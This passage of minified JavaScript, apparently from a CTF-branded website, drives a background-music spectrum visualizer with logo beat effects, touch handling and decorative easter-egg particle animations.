j=0,z=0,He=0,Fe=0,De=!1;window.addEventListener("touchstart",function(t){j=t.touches[0].clientY,He=Date.now(),De=!1},{passive:!0});window.addEventListener("touchmove",function(t){De=!0},{passive:!0});window.addEventListener("touchend",function(t){if(z=t.changedTouches[0].clientY,Fe=Date.now(),P){j<z&&Pe();return}let e=document.getElementById("bgmAudio");!e||e.paused||!document.getElementById("mainFooter")||setTimeout(()=>{Ct()},100)},{passive:!0});function Ct(){if(!document.getElementById("mainFooter"))return;let e=Math.abs(z-j),o=Fe-He;if(j<z&&e>5&&o<2e3)S>0&&W();else if(ke()){let n=window.innerHeight*.45;j>z&&e>n&&o<500&&Ae(0)}}var x=!1,B=null,y=null,T=null,I=[];var ve=0,M=null,U=null,H=!1,p=null,re=null,E=null,D=!1,ae=0,ce=0,X=0,K=0,Te=0,q=[],F=!1;function St(){try{B=new(window.AudioContext||window.webkitAudioContext);let t=document.getElementById("bgmAudio"),e=B.createMediaElementSource(t);y=B.createAnalyser(),y.fftSize=2048,y.smoothingTimeConstant=.8;let o=y.frequencyBinCount;return T=new Uint8Array(o),e.connect(y),y.connect(B.destination),xt(),!0}catch(t){return!1}}function xt(){if(!window.Worker){console.warn("Web Worker not supported, falling back to main thread"),H=!1;return}try{let t=(window.location.hostname==="localhost"||window.location.hostname==="127.0.0.1","./src/spectrum-worker.min.js");M=new Worker(t),H=!0,M.onmessage=function(e){let{type:o,data:n}=e.data;switch(o){case"initComplete":M.postMessage({type:"config",data:{fftSize:y.fftSize,sampleRate:B.sampleRate,beatThreshold:188,beatCooldown:25,heavyBeatCooldown:120}});break;case"processedSpectrumData":U=n;break;case"error":console.error("Spectrum worker error:",n);break;case"workerStopped":break}},M.onerror=function(e){console.error("Spectrum worker error:",e),H=!1},M.postMessage({type:"init",data:{fftSize:y.fftSize,sampleRate:B.sampleRate}})}catch(t){console.error("Failed to create spectrum worker:",t),H=!1}}var Z=!1;function Ne(){if(Z)return;let t=document.getElementById("logo");if(t){if(t.innerHTML.trim()!==""){Z=!0,p=t.querySelector("svg"),p&&(re={T0:p.querySelector(".T0"),K:p.querySelector(".K"),C:p.querySelector(".C"),T1:p.querySelector(".T1"),F:p.querySelector(".F")},E=p.querySelector("#progressClip rect"));return}fetch("./img/TKCTF512.svg").then(e=>e.text()).then(e=>{if(t.innerHTML=e,Z=!0,p=t.querySelector("svg"),p){p.id="logoSvg",p.style.width="100%",p.style.height="100%";let o=p.viewBox.baseVal,n=o.width||1e3;re={T0:p.querySelector(".T0"),K:p.querySelector(".K"),C:p.querySelector(".C"),T1:p.querySelector(".T1"),F:p.querySelector(".F")};let i=p.querySelector("defs");i||(i=document.createElementNS("http://www.w3.org/2000/svg","defs"),p.insertBefore(i,p.firstChild));let s=document.createElementNS("http://www.w3.org/2000/svg","clipPath");s.id="progressClip",E=document.createElementNS("http://www.w3.org/2000/svg","rect"),E.setAttribute("x","0"),E.setAttribute("y","0"),E.setAttribute("width","0"),E.setAttribute("height",o.height||1e3),s.appendChild(E),i.appendChild(s);let r=document.createElementNS("http://www.w3.org/2000/svg","g");r.id="progressGroup",r.setAttribute("clip-path","url(#progressClip)"),Object.values(re).forEach(c=>{if(c){c.style.fill="#010101";let a=c.cloneNode(!0);a.style.fill="#00a2ff",a.style.filter="drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))",r.appendChild(a)}}),p.appendChild(r)}}).catch(e=>console.error("\u52A0\u8F7DSVG\u5931\u8D25:",e))}}function Bt(){let t=document.getElementById("logoContainer");if(g)return;t.addEventListener("mousemove",o=>{let n=t.getBoundingClientRect(),i=n.left+n.width/2,s=n.top+n.height/2;ae=(o.clientX-i)/10,ce=(o.clientY-s)/10}),t.addEventListener("mouseleave",()=>{ae=0,ce=0});function e(){if(X+=(ae-X)*.15,K+=(ce-K)*.15,!D&&Math.abs(X)>.1||Math.abs(K)>.1){let o=document.getElementById("logo");(o.style.transform||"").includes("scale")||(o.style.transform=`translate(${X}px, ${K}px)`)}requestAnimationFrame(e)}e()}function ue(t){if(!p)return;let e=document.getElementById("logoContainer"),o=document.createElement("div");o.className="trail-particle";let n=p.cloneNode(!0);n.style.width="100%",n.style.height="100%",n.style.transform=`rotate(${t}deg)`,n.style.filter="drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)",o.appendChild(n),e.appendChild(o),setTimeout(()=>{o.style.opacity="0.6",o.style.transition="opacity 0.1s ease-out"},10),setTimeout(()=>{o.style.opacity="0",o.style.transition="opacity 0.3s ease-out"},100),setTimeout(()=>{o.remove()},400)}function Lt(t){let e=document.getElementById("logoContainer"),o=document.createElement("div");o.className="pulse-ring",o.style.width="120px",o.style.height="120px",o.style.border=`${3+t*2}px solid rgba(0, 255, 255, ${.9})`,o.style.boxShadow="0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)",o.style.animation="beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards",e.appendChild(o),setTimeout(()=>o.remove(),800)}function It(){let t=document.getElementById("logoContainer"),e=document.createElement("div");e.className="wave-ring",e.style.width="120px",e.style.height="120px",t.appendChild(e),setTimeout(()=>e.remove(),320)}function Mt(){if(!y||!T||!x)return;y.getByteFrequencyData(T);let t=0,e=0;H&&U?(t=U.spectrumFeatures.totalEnergy,e=U.spectrumFeatures.spectralCentroid):t=T.reduce((r,c)=>r+c)/T.length/255;let n=5+t*12,i=(Math.random()-.5)*(1+t*8);if(!F&&!D){let s=document.getElementById("logo"),r=(Math.random()-.5)*n,c=(Math.random()-.5)*n;s.style.transform=`translate(${r}px, ${c}px) rotate(${i}deg)`;let l=25+t*25,d=.6+t*.4;s.style.filter=`drop-shadow(0 0 ${l}px rgba(0, 162, 255, ${d}))`;let m=e>.5?.2:.25;t>m&&Math.random()>.75&&ue(i)}}function Ee(t,e,o){return Math.round(t/(e/2)*(o/2))}function kt(){if(!y||!T)return!1;y.getByteFrequencyData(T);let t=B.sampleRate,e=Ee(1500,t,y.fftSize),o=Ee(2250,t,y.fftSize),n=0,i=Math.max(1,o-e+1);for(let a=e;a<=o&&a<T.length;a++)n+=T[a];let s=n/i,r=188,c=Date.now();return s>r&&c-ve>25?(ve=c,!0):!1}function At(){if(!I.length)return!1;let t=Date.now(),e=v(),o,n,i,s;k==="high"?(o=.35,n=7/10,i=50,s=250):(o=.45,n=9/10,i=100,s=300);let r=I.length,c=Math.floor(r*.25),a=Math.floor(r*o),l=I.slice(c,a),d=0;l.forEach(w=>{w.classList.contains("active")&&d++});let m=Math.max(1,Math.ceil(l.length*n)),f=d>=m;return q.push({time:t,isActive:f}),q=q.filter(w=>t-w.time<=i),q.filter(w=>w.isActive).length>0&&t-Te>s?(Te=t,!0):!1}function Pt(){let t=document.getElementById("bgmAudio");if(!t.duration||!E||!p)return;let e=t.currentTime/t.duration,n=p.viewBox.baseVal.width||1e3;E.setAttribute("width",n*e)}function pe(){let t=document.getElementById("binarySpectrum"),e=v(),o=e.spectrumBarCount,n=e.spectrumBarWidth;if(t.innerHTML="",I=[],g&&o>10){let r=function(){let c=Math.min(i+s,o);for(let a=i;a<c;a++){let l=document.createElement("div");if(l.className="spectrum-bar",l.style.left=a*(100/o)+"%",l.style.height="0px",l.style.width=n+"px",e.enableBinaryDigits){let d=document.createElement("div");d.className="binary-digits",g&&k==="medium"&&d.classList.add("mobile-medium-digits");let m="",f=Math.floor(Math.random()*12)+8;for(let u=0;u<f;u++)m+=Math.random()>.5?"1":"0";d.textContent=m,l.appendChild(d)}t.appendChild(l),I.push(l)}i=c,i<o&&requestAnimationFrame(r)},i=0,s=Math.max(1,Math.floor(o/4));requestAnimationFrame(r)}else for(let i=0;i<o;i++){let s=document.createElement("div");if(s.className="spectrum-bar",s.style.left=i*(100/o)+"%",s.style.height="0px",s.style.width=n+"px",e.enableBinaryDigits){let r=document.createElement("div");r.className="binary-digits",g&&k==="medium"&&r.classList.add("mobile-medium-digits");let c="",a=Math.floor(Math.random()*12)+8;for(let l=0;l<a;l++)c+=Math.random()>.5?"1":"0";r.textContent=c,s.appendChild(r)}t.appendChild(s),I.push(s)}}function Re(){if(!y||!x)return;y.getByteFrequencyData(T),H&&M&&M.postMessage({type:"spectrumData",data:Array.from(T)});let t=B.sampleRate,e=document.getElementById("dataStreams"),o=document.getElementById("logoContainer"),n=document.getElementById("logo"),i=v();x&&i.enableDataStreamGlitch?(e.classList.remove("glitch-beat"),e.classList.add("glitch-subtle")):e.classList.remove("glitch-subtle","glitch-beat");let s=At(),r=kt();s&&!F&&i.enableLogoBeats?(F=!0,o.classList.add("heavy-beats"),o.classList.add("activity"),It(),[-12,-8,-4,0,4,8,12].forEach((a,l)=>{setTimeout(()=>ue(a),l*20)}),setTimeout(()=>{F=!1,o.classList.remove("heavy-beats"),o.classList.remove("activity")},200)):r&&!D&&!F&&i.enableLogoBeats&&(D=!0,o.classList.add("activity"),n.style.animation="beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards",[-8,-4,0,4,8].forEach((a,l)=>{setTimeout(()=>ue(a),l*30)}),Lt(1),setTimeout(()=>{D=!1,n.style.animation="",o.classList.remove("activity")},400),i.enableDataStreamGlitch&&(e.classList.remove("glitch-subtle"),e.classList.add("glitch-beat"),setTimeout(()=>{x&&(e.classList.remove("glitch-beat"),e.classList.add("glitch-subtle"))},250))),P?k==="low"?(e.style.setProperty("--egg-glow-radius","80px"),e.style.setProperty("--egg-glow-filter-blur","10px"),e.style.setProperty("--egg-glow-opacity","0.16"),e.style.setProperty("--egg-glow-duration","1.1s"),e.style.setProperty("--egg-highlight-brightness","1.35"),e.style.setProperty("--egg-highlight-saturate","1.2"),e.classList.add("egg-glow"),s&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},200))):k==="medium"?(e.style.setProperty("--egg-glow-radius","140px"),e.style.setProperty("--egg-glow-filter-blur","18px"),e.style.setProperty("--egg-glow-opacity","0.20"),e.style.setProperty("--egg-glow-duration","1.6s"),e.style.setProperty("--egg-highlight-brightness","1.75"),e.style.setProperty("--egg-highlight-saturate","1.45"),e.classList.add("egg-glow"),s&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},180))):(e.style.setProperty("--egg-glow-radius","200px"),e.style.setProperty("--egg-glow-filter-blur","22px"),e.style.setProperty("--egg-glow-opacity","0.24"),e.style.setProperty("--egg-glow-duration","2.0s"),e.style.setProperty("--egg-highlight-brightness","1.95"),e.style.setProperty("--egg-highlight-saturate","1.6"),e.classList.add("egg-glow"),(s||r)&&(e.classList.remove("egg-highlight"),e.offsetWidth,e.classList.add("egg-highlight"),setTimeout(()=>{e.classList.remove("egg-highlight")},140))):(e.classList.remove("egg-glow","egg-highlight"),e.style.removeProperty("--egg-glow-radius"),e.style.removeProperty("--egg-glow-filter-blur"),e.style.removeProperty("--egg-glow-opacity"),e.style.removeProperty("--egg-glow-duration"),e.style.removeProperty("--egg-highlight-brightness"),e.style.removeProperty("--egg-highlight-saturate")),Mt(),Ht(T),Pt(),x&&requestAnimationFrame(Re)}function Ht(t){if(!I.length)return;let e=I.length,o=Math.floor(t.length*.85),n=Math.floor(o/e);for(let i=0;i<e;i++){let s=i*n,r=t[s]||0,c=Math.max(5,r/255*100),a=I[i];a.classList.remove("stopping"),a.style.height=c+"px";let l=v();if(l.enableSpectrumHighlight&&(r>120?a.classList.add("active"):a.classList.remove("active"),l.enableBinaryDigits&&Math.random()>.92)){let d=a.querySelector(".binary-digits");if(d){let m="",f=Math.floor(Math.random()*12)+8;for(let u=0;u<f;u++)m+=Math.random()>.5?"1":"0";d.textContent=m}}}}function qe(){document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),I.forEach((e,o)=>{e.classList.add("stopping"),e.classList.remove("active"),setTimeout(()=>{e.style.height="0px",setTimeout(()=>{let n=e.querySelector(".binary-digits");n&&(n.textContent="")},400)},o*20)})}function O(t){let e=document.getElementById("audioStatus");switch(e.classList.remove("blink","show","hidden"),t){case"initial":e.textContent="\u70B9\u51FB LOGO \u64AD\u653E BGM",e.classList.add("blink");break;case"playing":e.classList.add("hidden");break;case"paused":e.textContent="\u70B9\u51FB LOGO \u7EE7\u7EED\u64AD\u653E",e.classList.add("show");break;default:e.classList.add("hidden")}}function Ft(){let t=document.getElementById("bgmAudio"),e=document.getElementById("logoContainer"),o=document.getElementById("logo");if(x){x=!1,e.classList.remove("playing","activity","heavy-beats"),O("paused"),o.style.transform="",o.style.animation="",D=!1,F=!1,q=[],W(),requestAnimationFrame(()=>{qe(),H&&M&&M.postMessage({type:"stop"})});let n=t.volume,i=500,s=20,r=n/s,c=i/s;t.fadeInterval&&clearInterval(t.fadeInterval);let a=0;t.fadeInterval=setInterval(()=>{a++;let l=n-r*a;t.volume=Math.max(0,l),a>=s&&(clearInterval(t.fadeInterval),t.fadeInterval=null,t.pause(),t.volume=1)},c)}else{if(!B&&!St()){O("initial");return}B.state==="suspended"&&B.resume(),t.fadeInterval&&(clearInterval(t.fadeInterval),t.fadeInterval=null),t.volume=1,t.play().then(()=>{x=!0,e.classList.add("playing"),O("playing"),document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),Re()}).catch(n=>{O("initial")})}}function Dt(){let t=document.getElementById("logoContainer"),e=document.getElementById("logo");x=!1,t.classList.remove("playing","activity","heavy-beats"),e.style.transform="",e.style.animation="",D=!1,F=!1,q=[],E&&E.setAttribute("width","0"),W(),requestAnimationFrame(()=>{qe()}),O("initial")}var Ce;window.addEventListener("resize",()=>{clearTimeout(Ce),Ce=setTimeout(()=>{g=window.innerWidth<768,xe();let t=window.pageYOffset||document.documentElement.scrollTop;Be(t),pe(),Q()},300)});document.addEventListener("visibilitychange",function(){let t=document.getElementById("bgmAudio");if(document.hidden&&x){let e=t.volume,o=.15,n=600,i=20,s=(e-o)/i,r=n/i,c=0,a=setInterval(()=>{c++,t.volume=Math.max(o,e-s*c),c>=i&&(clearInterval(a),t.volume=o)},r)}else if(!document.hidden&&x){let e=t.volume,o=1,n=350,i=20,s=(o-e)/i,r=n/i,c=0,a=setInterval(()=>{c++,t.volume=Math.min(o,e+s*c),c>=i&&(clearInterval(a),t.volume=o)},r)}});function Nt(){let t=Date.now();if(document.querySelector(".tech-particle-burst")||t-ye<mt)return;ye=t;let e=document.createElement("div");e.className="tech-particle-burst",document.body.appendChild(e);let n=document.getElementById("mainFooter").getBoundingClientRect(),i=n.top,s=n.left,r=n.width,a=v().particleCount;for(let l=0;l<a;l++){let d=document.createElement("div");d.className="tech-particle";let m=s+Math.random()*r,f=i+Math.random()*8;d.style.left=m+"px",d.style.top=f+"px",d.style.animationDelay=Math.random()*.4+"s";let u=2+Math.random()*3;d.style.width=u+"px",d.style.height=u+"px";let w=["#00e4ff","#00a2ff","#66ccff","#0099ff","#007acc","#4a90e2"],h=w[Math.floor(Math.random()*w.length)];d.style.background=h,d.style.boxShadow=`0 0 8px ${h}, 0 0 16px ${h}80`;let ge=(Math.random()-.5)*20;d.style.setProperty("--horizontal-offset",ge+"px"),e.appendChild(d)}setTimeout(()=>{e.parentNode&&e.parentNode.removeChild(e)},1500)}var J=null,C=null;function Rt(){Oe(),C=document.createElement("div"),C.className="easter-egg-particle-container",C.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1002;
        overflow: hidden;
    `,document.body.appendChild(C),J=setInterval(()=>{qt()},800)}function Oe(){J&&(clearInterval(J),J=null),C&&(C.parentNode&&C.parentNode.removeChild(C),C=null)}function qt(){if(!C)return;let t=document.createElement("div");t.className="easter-egg-particle";let e=Math.random()*window.innerWidth,o=window.innerHeight-Math.random()*20;t.style.left=e+"px",t.style.top=o+"px";let n=(Math.random()-.5)*40;t.style.setProperty("--horizontal-offset",n+"px");let i=1.5+Math.random()*2.5;t.style.width=i+"px",t.style.height=i+"px";let s=["#00e4ff","#00a2ff","#66ccff","#0099ff","#33bbff","#00ccff"],r=s[Math.floor(Math.random()*s.length)];t.style.background=r,t.style.boxShadow=`0 0 4px ${r}, 0 0 8px rgba(0, 228, 255, 0.3)`,t.style.animation="easterEggParticleFloat 6s ease-out forwards",C.appendChild(t),setTimeout(()=>{t.parentNode&&t.parentNode.removeChild(t)},6e3)}})();
